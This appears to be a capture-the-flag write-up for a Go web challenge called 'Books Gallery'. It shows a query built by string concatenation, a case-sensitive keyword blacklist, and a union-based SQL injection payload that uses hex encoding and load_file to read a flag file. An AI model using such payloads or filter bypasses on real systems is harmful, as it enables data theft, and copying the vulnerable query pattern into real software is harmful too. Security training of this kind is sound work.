@@ -1,0 +1,130 @@
+---
+icon: globe
+---
+
+# Books Gallery
+
+### Challenge Description
+
+Author : anakmamah
+
+Lately, Pak Vincent has enjoyed reading books, but when he tried to search for a specific book, he realized that a feature was missing. He wondered why it had disappeared, especially since he was about to use it to find the book he wanted to read.
+
+### Flag
+
+`HOLOGY7{8uKu_@d41ah_J3nd3la_dUn1A_uW4W}`
+
+***
+
+### Analysis
+
+We are given a full source-code of a website written in Go. Looking at the `docker-compose.yml` file, we can see that the flag is stored on the database container meaning that we could use an SQL injection to solve this challenge. And also, the database for this challenge is using MySQL, so that could be important later on.
+
+```yaml
+# snip
+  db:
+    image: mysql:8.0
+    container_name: books-galery-db
+    restart: always
+    environment:
+      - MYSQL_ROOT_PASSWORD=password
+      - MYSQL_USER=user
+      - MYSQL_PASSWORD=password
+      - MYSQL_DATABASE=books_galery
+    ports:
+      - "3306:3306"
+    volumes:
+      - ./flag.txt:/var/lib/mysql-files/flag.txt
+      - ./database/database.sql:/docker-entrypoint-initdb.d/database.sql
+# snip
+```
+
+From the `ShowBooks` controller, we can see that the parameters are concatenated to the query meaning that we could inject SQL statements to it. But, there is a `SanitizeData` function that implement some sort of blacklisting.
+
+```go
+// snip
+func ShowBooks(db *sql.DB) gin.HandlerFunc {
+		searchQuery := c.Query("query")
+		searchQuery = lib.SanitizeData(searchQuery)
+		log.Printf("Search query: %s", searchQuery)
+		
+		var rows *sql.Rows
+		var err error
+		if searchQuery != "" {
+			query := `
+				SELECT b.book_id, b.title, b.author, b.img_path 
+				FROM books b 
+				JOIN genres g ON b.genre_id = g.genre_id 
+				WHERE b.title LIKE '%` + searchQuery + `%' OR b.author LIKE '%` + searchQuery + `%'`
+			rows, err = db.Query(query)
+		} else {
+			query := `SELECT b.book_id, b.title, b.author, b.img_path 
+			          FROM books b 
+			          JOIN genres g ON b.genre_id = g.genre_id`
+			rows, err = db.Query(query)
+		}
+// snip
+```
+
+```go
+func SanitizeData(input string) string {
+	replacements := []struct {
+		old string
+		new string
+	}{
+		{"..", "x"},
+		{"--", "x"},
+		{"/*", "x"},
+		{"HAVING", "x"},
+		{"UNION", "x"},
+		{"SUBSTRING", "x"},
+		{"ASCII", "x"},
+		{"SHA1", "x"},
+		{"ROW_COUNT", "x"},
+		{"SELECT", "x"},
+		{"INSERT", "x"},
+		{"CASE WHEN", "x"},
+		{"INFORMATION_SCHEMA", "x"},
+		{"FILE", "x"},
+		{"DROP", "x"},
+		{"RLIKE", "x"},
+		{" IF ", "x"},
+		{" OR ", "x"},
+		{"CONCAT", "x"},
+		{"WHERE", "x"},
+		{"UPDATE", "x"},
+		{"or 1", "x"},
+		{"or 1=1", "x"},
+		{"flag", "x"},
+		{"txt", "x"},
+		{"or true", "x"},
+		{"=", ""},
+		{"+", "-"},
+		{"\\", "x"},
+		{"=$", "+$"},
+		{"+$", "=$"},
+	}
+
+	input = strings.TrimSpace(input)
+
+	for _, r := range replacements {
+		input = strings.ReplaceAll(input, r.old, r.new)
+	}
+
+	return input
+}
+```
+
+One problem with the sanitization is that the replacement does not account for capitalization. Since SQL does not check for capitalization, the statement blacklists are useless. But, we still cannot use `flag` or `txt` as our input. Therefore, we can use encoding to bypass this blacklist.
+
+### Solution
+
+The payload is a basic union-based SQL injection but we will open the `flag.txt` file and output it on one of the rows.
+
+```
+' union select 1,load_file(unhex('2f7661722f6c69622f6d7973716c2d66696c65732f666c61672e747874')),1,1 from users %23
+```
+
+Then we just use that as our `query` and the flag will be printed out!
+
+<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption><p>Flag is shown after inputting payload</p></figcaption></figure>
